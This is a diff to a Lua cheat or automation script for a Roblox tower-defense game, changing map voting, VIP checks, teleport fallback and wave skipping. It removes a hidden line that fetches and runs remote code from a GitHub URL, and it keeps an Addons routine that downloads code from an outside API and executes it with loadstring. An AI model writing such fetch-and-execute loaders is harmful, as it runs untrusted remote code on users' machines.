@@ -26,6 +26,8 @@ if not send_request then
 end
 
 -- // services & main refs
+local teleport_service = game:GetService("TeleportService")
+local marketplace_service = game:GetService("MarketplaceService")
 local replicated_storage = game:GetService("ReplicatedStorage")
 local remote_func = replicated_storage:WaitForChild("RemoteFunction")
 local remote_event = replicated_storage:WaitForChild("RemoteEvent")
@@ -58,10 +60,6 @@ local ItemNames = {
     ["110415073436604"] = "Holy Hand Grenade(s)",
     ["139414922355803"] = "Present Clusters(s)"
 }
-
-task.spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ColaCydiaRepo/Scripts/main/hello%20world.html'))()
-end)
 
 -- // tower management core
 local TDS = {
@@ -381,8 +379,13 @@ local function lobby_ready_up()
     end)
 end
 
-local function select_map_override(map_id)
-    remote_func:InvokeServer("LobbyVoting", "Override", map_id)
+local function select_map_override(map_id, ...)
+    local args = {...}
+
+    if args[#args] == "vip" then
+        remote_func:InvokeServer("LobbyVoting", "Override", map_id)
+    end
+
     task.wait(3)
     cast_map_vote(map_id, Vector3.new(12.59, 10.64, 52.01))
     task.wait(1)
@@ -402,6 +405,18 @@ local function cast_modifier_vote(mods_table)
     pcall(function()
         bulk_modifiers:InvokeServer(selected_mods)
     end)
+end
+
+local function is_map_available(name)
+    for _, g in ipairs(workspace:GetDescendants()) do
+        if g:IsA("SurfaceGui") and g.Name == "MapDisplay" then
+            local t = g:FindFirstChild("Title")
+            if t and t.Text == name then
+                return true
+            end
+        end
+    end
+    return false
 end
 
 -- // timescale logic
@@ -707,6 +722,9 @@ function TDS:Loadout(...)
 end
 
 function TDS:Addons()
+    if game_state ~= "GAME" then
+        return false
+    end
     local url = "https://api.junkie-development.de/api/v1/luascripts/public/57fe397f76043ce06afad24f07528c9f93e97730930242f57134d0b60a2d250b/download"
     local success, code = pcall(game.HttpGet, game, url)
 
@@ -716,7 +734,7 @@ function TDS:Addons()
 
     loadstring(code)()
 
-    while not (TDS.Equip and TDS.MultiMode and TDS.Multiplayer) do
+    while not TDS.Equip do
         task.wait(0.1)
     end
 
@@ -730,6 +748,8 @@ end
 
 function TDS:VoteSkip(start_wave, end_wave)
     task.spawn(function()
+        local current_wave = get_current_wave()
+        start_wave = current_wave or start_wave
         end_wave = end_wave or start_wave
 
         for wave = start_wave, end_wave do
@@ -742,9 +762,9 @@ function TDS:VoteSkip(start_wave, end_wave)
                 local skip_visible = player_gui:FindFirstChild("ReactOverridesVote")
                     and player_gui.ReactOverridesVote:FindFirstChild("Frame")
                     and player_gui.ReactOverridesVote.Frame:FindFirstChild("votes")
-                    and player_gui.ReactOverridesVote.Frame.votes:FindFirstChild("vote")
+                    and player_gui.ReactOverridesVote.Frame.votes:FindFirstChild("vote", true)
 
-                if skip_visible then
+                if skip_visible and skip_visible.Position == UDim2.new(0.5, 0, 0.5, 0) then
                     run_vote_skip()
                     skip_done = true
                 else
@@ -760,10 +780,16 @@ function TDS:GameInfo(name, list)
     if game_state ~= "GAME" then return false end
 
     local vote_gui = player_gui:WaitForChild("ReactGameIntermission", 30)
+    if not (vote_gui and vote_gui.Enabled and vote_gui:WaitForChild("Frame", 5)) then return end
 
-    if vote_gui and vote_gui.Enabled and vote_gui:WaitForChild("Frame", 5) then
-        cast_modifier_vote(list)
+    cast_modifier_vote(list)
+
+    if marketplace_service:UserOwnsGamePassAsync(local_player.UserId, 10518590) then
+        select_map_override(name, "vip")
+    elseif is_map_available(name) then
         select_map_override(name)
+    else
+        teleport_service:Teleport(3260590327, local_player)
     end
 end
 
@@ -801,7 +827,6 @@ function TDS:Place(t_name, px, py, pz, ...)
     if args[#args] == "stack" or args[#args] == true then
         py = 95
     end
-
     if game_state ~= "GAME" then
         return false 
     end
@@ -868,7 +893,6 @@ function TDS:Sell(idx, req_wave)
     end
     local t = self.placed_towers[idx]
     if t and do_sell_tower(t) then
-        table.remove(self.placed_towers, idx)
         return true
     end
     return false
